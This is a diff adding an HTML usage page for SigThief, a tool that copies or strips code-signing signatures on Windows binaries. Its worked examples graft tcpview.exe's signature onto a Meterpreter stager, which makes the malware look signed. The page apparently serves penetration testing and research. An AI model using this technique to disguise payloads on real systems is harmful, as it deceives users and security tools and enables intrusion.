@@ -1,0 +1,42 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>SigThief</title>
+</head><body><tt><b><u><span style="font-size: 14pt">Take a Signature from a binary and add it to another binary</span></u></b><br/>
+$ ./sigthief.py -i tcpview.exe -t x86_meterpreter_stager.exe -o /tmp/msftesting_tcpview.exe <br/>
+Output file: /tmp/msftesting_tcpview.exe<br/>
+Signature appended. <br/>
+FIN.<br/>
+<br/>
+<span style="font-size: 6pt">------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+</span><br/>
+<span style="font-size: 14pt"><u><b>Save Signature to disk for use later</b></u></span><br/>
+$ ./sigthief.py -i tcpview.exe -r                            <br/>
+Ripping signature to file!<br/>
+Output file: tcpview.exe_sig<br/>
+Signature ripped. <br/>
+FIN.<br/>
+<br/>
+<span style="font-size: 6pt">------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+</span><br/>
+<span style="font-size: 14pt"><u><b>Use the ripped signature</b></u></span><br/>
+$ ./sigthief.py -s tcpview.exe_sig -t x86_meterpreter_stager.exe                <br/>
+Output file: x86_meterpreter_stager.exe_signed<br/>
+Signature appended. <br/>
+FIN.<br/>
+<br/>
+<span style="font-size: 6pt">------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+</span><br/>
+<u><span style="font-size: 14pt"><b>Truncate (remove) signature</b></span></u><br/>
+$ ./sigthief.py -i tcpview.exe -T  <br/>
+Inputfile is signed!<br/>
+Output file: tcpview.exe_nosig<br/>
+Overwriting certificate table pointer and truncating binary<br/>
+Signature removed. <br/>
+FIN.<br/>
+<br/>
+<span style="font-size: 6pt">------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+</span><br/>
+<span style="font-size: 14pt"><u><b>Check if there is a signature (does not check validity)</b></u></span><br/>
+$ ./sigthief.py -i tcpview.exe -c<br/>
+Inputfile is signed!</tt></body></html>
